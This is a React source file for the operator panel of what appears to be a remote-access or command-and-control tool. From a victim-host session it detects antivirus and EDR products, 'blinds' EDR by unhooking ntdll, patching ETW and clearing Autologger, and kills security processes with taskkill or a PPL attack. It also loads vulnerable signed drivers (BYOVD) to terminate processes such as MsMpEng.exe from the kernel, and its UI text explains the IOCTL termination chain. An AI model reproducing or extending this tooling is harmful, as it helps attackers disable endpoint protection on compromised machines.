import { useState, useEffect, useRef, useMemo, type CSSProperties } from 'react'
import { RefreshCw, Copy, ShieldCheck, ShieldAlert, EyeOff, Skull, Package } from 'lucide-react'
import { sessionApi, driversApi } from '../api'
import type { Session } from '../types'
import type { BuiltinDriver } from '../api'

/** ArrayBuffer → base64（分块，避免大文件调用栈溢出） */
function arrayBufferToBase64(buf: ArrayBuffer): string {
  const bytes = new Uint8Array(buf)
  let binary = ''
  const chunk = 0x8000
  for (let i = 0; i < bytes.length; i += chunk) {
    binary += String.fromCharCode(...bytes.subarray(i, i + chunk))
  }
  return btoa(binary)
}

interface AVHit {
  name: string
  category: string
  process: string
}

const CATEGORY_BADGE: Record<string, string> = {
  '杀毒软件': 'danger',
  'EDR': 'warning',
  '安全工具': 'info',
}

/** 杀软识别 Tab：向会话下发 av_detect 任务，轮询结果并可视化命中产品 */
export function AVDetectTab({ session }: { session: Session }) {
  const [hits, setHits] = useState<AVHit[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [lastScanAt, setLastScanAt] = useState<number>(0)
  const [edrBusy, setEdrBusy] = useState(false)
  const [edrMsg, setEdrMsg] = useState('')
  const [edrProcesses, setEdrProcesses] = useState('')
  const [byovdB64, setByovdB64] = useState('')
  const [byovdSvc, setByovdSvc] = useState('')
  /** 设备名（不含 \\.\ 前缀）与终止 IOCTL：加载驱动时一并上报，服务端登记为驱动档案 */
  const [byovdDev, setByovdDev] = useState('')
  const [byovdIoctl, setByovdIoctl] = useState('')
  const [byovdFile, setByovdFile] = useState('')
  const [builtinDrivers, setBuiltinDrivers] = useState<BuiltinDriver[]>([])
  const [builtinLoading, setBuiltinLoading] = useState('')
  /** BYOVD 击杀目标：PID 或进程名 */
  const [byovdKillTarget, setByovdKillTarget] = useState('')
  /** 驱动击杀使用的驱动（默认用本次加载登记的驱动档案） */
  const [byovdKillDriver, setByovdKillDriver] = useState('')
  const loadedRef = useRef(false)

  /** 输入框样式（BYOVD 击杀/自定义驱动区复用） */
  const inputStyle: CSSProperties = {
    padding: '8px 10px',
    borderRadius: 6,
    border: '1px solid var(--border, #3a3a4a)',
    background: 'var(--bg-elevated, #1e1e2a)',
    color: 'var(--text, #e5e5ea)',
    fontSize: 12,
  }
  /** 行内代码样式（设备名/IOCTL/哈希） */
  const codeStyle: CSSProperties = {
    fontFamily: 'var(--mono, monospace)',
    fontSize: 11,
    padding: '1px 5px',
    margin: '0 2px',
    borderRadius: 3,
    background: 'var(--bg-elevated, #1e1e2a)',
    border: '1px solid var(--border, #3a3a4a)',
    color: 'var(--text, #e5e5ea)',
  }

  const pollTask = async (taskId: number): Promise<{ status: string; output: string } | null> => {
    const intervals = [0, 200, 300, 500, 1000, 2000]
    for (let i = 0; i < 40; i++) {
      try {
        const r = await fetch(`/api/v1/tasks/${taskId}`, {
          headers: { Authorization: `Bearer ${localStorage.getItem('toshell-token')}` },
        })
        const t = await r.json()
        if (t.status === 'completed') return { status: 'completed', output: t.output || '' }
        if (t.status === 'failed') return { status: 'failed', output: t.error || '任务执行失败' }
      } catch (e) { /* 忽略单次轮询异常，继续等待 */ }
      await new Promise(res => setTimeout(res, intervals[Math.min(i, intervals.length - 1)]))
    }
    return null
  }

  /** 解析服务端归一化后的命中 JSON；兼容旧格式 / 空输出 */
  const parseOutput = (output: string): AVHit[] => {
    if (!output || !output.trim()) return []
    try {
      const arr = JSON.parse(output)
      if (!Array.isArray(arr)) return []
      return arr
        .filter((x): x is { name: string; category?: string; process?: string } => x && typeof x.name === 'string')
        .map(x => ({ name: x.name, category: x.category || '安全工具', process: x.process || '' }))
    } catch (e) {
      return []
    }
  }

  const scan = async () => {
    setLoading(true)
    setError('')
    try {
      const r = await sessionApi.interact(session.id, '', 'av_detect')
      if (r?.data?.task_id) {
        const res = await pollTask(r.data.task_id)
        if (res && res.status === 'completed') {
          setHits(parseOutput(res.output))
          setLastScanAt(Date.now())
        } else if (res) {
          setError(res.output || '任务执行失败')
        } else {
          setError('查询超时，会话可能已离线或任务未执行')
        }
      } else {
        setError('无法创建 av_detect 任务')
      }
    } catch (e) {
      setError(`请求失败：${e instanceof Error ? e.message : String(e)}`)
    }
    setLoading(false)
  }

  useEffect(() => {
    if (!loadedRef.current) {
      loadedRef.current = true
      scan()
    }
  }, [session.id])

  useEffect(() => {
    driversApi.list().then(r => setBuiltinDrivers(r.data?.drivers || [])).catch(() => {})
  }, [])

  /** EDR 处置：失明 / 击杀 */
  const runEdr = async (kind: 'blind' | 'kill') => {
    setEdrBusy(true)
    setEdrMsg('')
    try {
      let taskId: number | undefined
      if (kind === 'blind') {
        const r = await sessionApi.edrBlind(session.id)
        taskId = r.data?.task_id
      } else {
        const names = edrProcesses.split(',').map(s => s.trim()).filter(Boolean)
        const r = await sessionApi.edrKill(session.id, names.length ? names : undefined)
        taskId = r.data?.task_id
      }
      if (!taskId) {
        setEdrMsg('未返回 task_id')
        return
      }
      setEdrMsg(`任务已下发 (task_id=${taskId})，等待结果...`)
      const res = await pollTask(taskId)
      if (res && res.status === 'completed') setEdrMsg(res.output || '（无输出）')
      else if (res) setEdrMsg('失败: ' + res.output)
      else setEdrMsg('执行超时，会话可能离线')
    } catch (e) {
      setEdrMsg('请求失败: ' + (e instanceof Error ? e.message : String(e)))
    } finally {
      setEdrBusy(false)
    }
  }

  /** 读取 .sys 驱动文件为 base64 */
  const handleDriverFile = (file: File | undefined) => {
    if (!file) return
    const reader = new FileReader()
    reader.onload = () => {
      const result = reader.result as string
      const idx = result.indexOf(',')
      setByovdB64(idx >= 0 ? result.slice(idx + 1) : result)
      setByovdFile(file.name)
    }
    reader.readAsDataURL(file)
  }

  /** 通用任务下发 + 轮询 */
  const runTask = async (fn: () => Promise<number | undefined>) => {
    setEdrBusy(true)
    setEdrMsg('')
    try {
      const taskId = await fn()
      if (!taskId) {
        setEdrMsg('未返回 task_id')
        return
      }
      setEdrMsg(`任务已下发 (task_id=${taskId})，等待结果...`)
      const res = await pollTask(taskId)
      if (res && res.status === 'completed') setEdrMsg(res.output || '（无输出）')
      else if (res) setEdrMsg('失败: ' + res.output)
      else setEdrMsg('执行超时，会话可能离线')
    } catch (e) {
      setEdrMsg('请求失败: ' + (e instanceof Error ? e.message : String(e)))
    } finally {
      setEdrBusy(false)
    }
  }

  const loadDriver = () => runTask(async () => {
    if (!byovdB64) {
      setEdrMsg('请先选择 .sys 驱动文件')
      return undefined
    }
    if (!byovdSvc.trim()) {
      setEdrMsg('请填写服务名（SCM 服务名，加载后用于卸载）')
      return undefined
    }
    // 设备名与终止 IOCTL 一并上报：服务端据此登记"本会话驱动档案"，
    // 后续「驱动击杀」直接用该档案，无需每次手填。
    const r = await sessionApi.byovdLoad(session.id, {
      driver_b64: byovdB64,
      service_name: byovdSvc.trim(),
      name: byovdFile || undefined,
      device_name: byovdDev.trim() || undefined,
      kill_ioctl: byovdIoctl.trim() || undefined,
    })
    return r.data?.task_id
  })

  /** 加载服务端 drivers/ 目录里的驱动（驱动由操作员自行放置，服务端不再内置） */
  const loadBuiltinDriver = (d: BuiltinDriver) => runTask(async () => {
    setBuiltinLoading(d.name)
    if (d.service) setByovdSvc(d.service)
    if (d.device) setByovdDev(d.device.replace(/^\\\\\.\\/, ''))
    if (d.ioctl) setByovdIoctl('0x' + d.ioctl.toString(16).toUpperCase())
    try {
      const buf = await driversApi.raw(d.name)
      const r = await sessionApi.byovdLoad(session.id, {
        driver_b64: arrayBufferToBase64(buf),
        service_name: d.service,
        name: d.name,
        device_name: d.device ? d.device.replace(/^\\\\\.\\/, '') : undefined,
        kill_ioctl: d.ioctl ? '0x' + d.ioctl.toString(16).toUpperCase() : undefined,
      })
      return r.data?.task_id
    } finally {
      setBuiltinLoading('')
    }
  })

  const unloadDriver = () => runTask(async () => {
    const r = await sessionApi.byovdUnload(session.id, byovdSvc || undefined)
    return r.data?.task_id
  })

  /** 驱动击杀：使用操作员提供的驱动（设备名/IOCTL 由服务端从驱动档案下发） */
  const byovdKill = () => runTask(async () => {
    const target = byovdKillTarget.trim()
    if (!target) {
      setEdrMsg('请填写要击杀的 PID 或进程名（如 MsMpEng.exe）')
      return undefined
    }
    const isPID = /^\d+$/.test(target)
    const payload = isPID
      ? { pid: Number(target), driver: byovdKillDriver || undefined }
      : { process_name: target, driver: byovdKillDriver || undefined }
    const r = await sessionApi.byovdKill(session.id, payload)
    return r.data?.task_id
  })

  const pplKill = () => runTask(async () => {
    const names = edrProcesses.split(',').map(s => s.trim()).filter(Boolean)
    const r = await sessionApi.pplKill(session.id, names.length ? names : undefined)
    return r.data?.task_id
  })

  const catCounts = useMemo(() => {
    const m: Record<string, number> = {}
    for (const h of hits) m[h.category] = (m[h.category] || 0) + 1
    return m
  }, [hits])

  const copyResult = () => {
    const text = hits.length ? JSON.stringify(hits, null, 2) : '未发现已知安全软件'
    navigator.clipboard.writeText(text)
  }

  const badgeClass = (cat: string) => `status-badge ${CATEGORY_BADGE[cat] || 'info'}`

  return (
    <div className="process-tab av-tab">
      <div className="process-toolbar">
        <button className="btn-small btn-primary" onClick={scan} disabled={loading}>
          <RefreshCw size={14} className={loading ? 'spin' : ''} />
          {loading ? '扫描中...' : '重新扫描'}
        </button>
        <button className="btn-small" onClick={copyResult} disabled={hits.length === 0}>
          <Copy size={14} /> 复制结果
        </button>
      </div>

      {error && <div className="av-error">扫描失败：{error}</div>}

      {hits.length > 0 && (
        <div className="av-stats">
          <div className="av-stat-card">
            <div className="av-stat-num">{hits.length}</div>
            <div className="av-stat-label">命中产品</div>
          </div>
          {Object.entries(catCounts).map(([cat, n]) => (
            <div className="av-stat-card" key={cat}>
              <div className="av-stat-num">
                <span className={badgeClass(cat)}>{cat}</span>
              </div>
              <div className="av-stat-label">{n} 项</div>
            </div>
          ))}
        </div>
      )}

      {hits.length > 0 ? (
        <div className="process-list av-list">
          <table>
            <thead>
              <tr>
                <th style={{ width: '38%' }}>产品</th>
                <th style={{ width: '22%' }}>类别</th>
                <th>进程</th>
              </tr>
            </thead>
            <tbody>
              {hits.map(h => (
                <tr key={`${h.name}-${h.process}`}>
                  <td>{h.name}</td>
                  <td><span className={badgeClass(h.category)}>{h.category}</span></td>
                  <td><span className="mono">{h.process}</span></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      ) : (
        !loading && !error && (
          <div className="empty-state" style={{ padding: '40px 20px' }}>
            <ShieldCheck size={40} />
            <p>未发现已知安全软件</p>
            <span>该主机运行进程未命中当前指纹库{lastScanAt ? `（上次扫描：${new Date(lastScanAt).toLocaleTimeString()}）` : ''}</span>
          </div>
        )
      )}

      {loading && hits.length === 0 && !error && (
        <div className="empty-state" style={{ padding: '40px 20px' }}>
          <ShieldAlert size={40} />
          <p>正在下发 av_detect 任务并等待结果...</p>
        </div>
      )}

      {/* EDR 处置：失明 / 击杀 */}
      <div style={{ marginTop: 18, borderTop: '1px solid var(--border, #3a3a4a)', paddingTop: 14 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
          <ShieldAlert size={16} color="#ff9f43" />
          <span style={{ fontWeight: 600, fontSize: 14 }}>EDR 处置</span>
        </div>
        <p style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', margin: '0 0 10px', lineHeight: 1.7 }}>
          「EDR 失明」：ntdll 脱钩 + ETW patch + Autologger 清理（不杀进程，隐蔽）；<br />
          「击杀杀软」：taskkill 强制终止杀软/EDR 进程（<span style={{ color: '#ff6b6b' }}>会触发告警，PPL 保护进程可能失败，慎用</span>）。
        </p>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
          <input
            type="text"
            value={edrProcesses}
            onChange={(e) => setEdrProcesses(e.target.value)}
            placeholder="自定义进程名，逗号分隔（留空 = 内置默认杀软列表）"
            style={{ flex: 1, minWidth: 260, padding: '8px 10px', borderRadius: 6, border: '1px solid var(--border, #3a3a4a)', background: 'var(--bg-elevated, #1e1e2a)', color: 'var(--text, #e5e5ea)', fontSize: 12 }}
          />
          <button className="btn-primary" onClick={() => runEdr('blind')} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <EyeOff size={14} /> EDR 失明
          </button>
          <button className="btn-small danger" onClick={() => runEdr('kill')} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <Skull size={14} /> 击杀杀软
          </button>
          <button className="btn-small danger" onClick={pplKill} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <Skull size={14} /> PPL 击杀
          </button>
        </div>
        {edrMsg && (
          <pre style={{ marginTop: 10, fontSize: 12, color: 'var(--text-dim, #9a9aab)', background: 'var(--bg-deep, #12121a)', border: '1px solid var(--border, #3a3a4a)', borderRadius: 6, padding: 10, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
            {edrMsg}
          </pre>
        )}
      </div>

      {/* BYOVD 驱动：加载 + 进程击杀 */}
      <div style={{ marginTop: 18, borderTop: '1px solid var(--border, #3a3a4a)', paddingTop: 14 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
          <Skull size={16} color="#ff6b6b" />
          <span style={{ fontWeight: 600, fontSize: 14 }}>BYOVD 驱动（内核级击杀）</span>
          <span style={{ fontSize: 11, color: 'var(--text-dim, #9a9aab)' }}>仅授权测试环境使用</span>
        </div>

        <div style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', lineHeight: 1.8, marginBottom: 12 }}>
          <div>
            本版本**不再内置任何驱动**（内置即等于把驱动名与 IOCTL 明文写进服务端与每个载荷，是最稳定的查杀特征）。
            请自行准备已签名的易受攻击驱动 <code style={codeStyle}>*.sys</code>：放到服务端
            <code style={codeStyle}>drivers/</code> 目录（或 <code style={codeStyle}>data/drivers/</code>），配 <code style={codeStyle}>manifest.json</code>
            声明 <code style={codeStyle}>device/service/ioctl</code>；也可以直接在下面选择 .sys 上传并手填这几项。
          </div>
          <div style={{ marginTop: 6 }}>
            常见「进程终止型」驱动：暴露一个无鉴权终止 IOCTL（METHOD_BUFFERED，入参首个 DWORD = PID），驱动内部
            <code style={codeStyle}>PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) → ZwTerminateProcess</code>，
            因此不需要调用方持有目标进程权限，可用于击杀普通杀软/EDR 进程；**对 PPL 保护进程无效**（那类走上方「PPL 击杀」的句柄窃取路线）。
          </div>
          <div style={{ marginTop: 6 }}>
            加载前请自行核对 SHA-256 与签名（<code style={codeStyle}>signtool verify /pa /all your.sys</code>）；加载后记得点「卸载驱动」清理内核服务与文件。
            服务端只做透传与档案登记，不对驱动合法性背书。
          </div>
        </div>

        {/* 服务端 drivers/ 目录里已放置的驱动（操作员自备） */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 12 }}>
          <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', display: 'inline-flex', alignItems: 'center', gap: 4 }}>
            <Package size={13} /> 服务端 drivers/ 目录：
          </span>
          {builtinDrivers.length === 0 && (
            <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>
              目录为空（把 .sys 放进去并刷新，或在下方直接上传）
            </span>
          )}
          {builtinDrivers.map(d => (
            <button
              key={d.name}
              className="btn-small"
              onClick={() => loadBuiltinDriver(d)}
              disabled={edrBusy || builtinLoading !== ''}
              title={`${d.description || '（manifest 未写 description）'}\n设备: ${d.device || '（未声明）'}  服务名: ${d.service || '（未声明）'}\n用途: ${d.purpose || '（未声明）'}\nIOCTL: ${d.ioctl ? '0x' + d.ioctl.toString(16).toUpperCase() : '（未声明）'}\nSHA256: ${d.sha256}`}
              style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}
            >
              <Skull size={13} />
              {builtinLoading === d.name ? '加载中...' : d.name}
            </button>
          ))}
          <button className="btn-small" onClick={unloadDriver} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            卸载驱动
          </button>
        </div>

        {/* 击杀进程 */}
        <div style={{ padding: '10px 12px', border: '1px solid var(--border, #3a3a4a)', borderRadius: 6, background: 'var(--bg-deep, #12121a)', marginBottom: 12 }}>
          <div style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', marginBottom: 8 }}>
            击杀目标进程（PID 或进程名）：使用本次加载登记的驱动档案（设备名 + 终止 IOCTL）
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
            <input
              type="text"
              value={byovdKillTarget}
              onChange={(e) => setByovdKillTarget(e.target.value)}
              placeholder="如 1234 或 MsMpEng.exe / 360tray.exe"
              style={{ ...inputStyle, width: 240 }}
            />
            {builtinDrivers.length > 1 && (
              <select value={byovdKillDriver} onChange={(e) => setByovdKillDriver(e.target.value)} style={{ ...inputStyle, width: 190 }}>
                <option value="">默认驱动（{builtinDrivers[0]?.name}）</option>
                {builtinDrivers.map(d => (
                  <option key={d.name} value={d.name}>{d.name}</option>
                ))}
              </select>
            )}
            <button className="btn-small danger" onClick={byovdKill} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
              <Skull size={13} /> 驱动击杀
            </button>
          </div>
        </div>

        {/* 自定义驱动上传 */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
          <label className="btn-small" style={{ display: 'inline-flex', alignItems: 'center', gap: 6, cursor: 'pointer' }}>
            选择 .sys 驱动
            <input type="file" accept=".sys" style={{ display: 'none' }} onChange={(e) => handleDriverFile(e.target.files?.[0])} />
          </label>
          {byovdFile && <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>{byovdFile}</span>}
          <input
            type="text"
            value={byovdSvc}
            onChange={(e) => setByovdSvc(e.target.value)}
            placeholder="服务名 *（SCM 服务名，用于卸载）"
            style={{ ...inputStyle, width: 200 }}
          />
          <input
            type="text"
            value={byovdDev}
            onChange={(e) => setByovdDev(e.target.value)}
            placeholder="设备名（如 yourdrv，不含 \\.\）"
            style={{ ...inputStyle, width: 190 }}
          />
          <input
            type="text"
            value={byovdIoctl}
            onChange={(e) => setByovdIoctl(e.target.value)}
            placeholder="终止 IOCTL（如 0x222048）"
            style={{ ...inputStyle, width: 180 }}
          />
          <button className="btn-primary" onClick={loadDriver} disabled={edrBusy || !byovdB64} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <Skull size={14} /> 加载驱动
          </button>
        </div>
        <div style={{ fontSize: 11, color: 'var(--text-dim, #9a9aab)', marginTop: 6 }}>
          设备名与终止 IOCTL 只在「驱动击杀」时使用；填了就会被登记为本次会话的驱动档案（也可留空，届时击杀请求需自带 device/ioctl）。
        </div>
      </div>
    </div>
  )
}
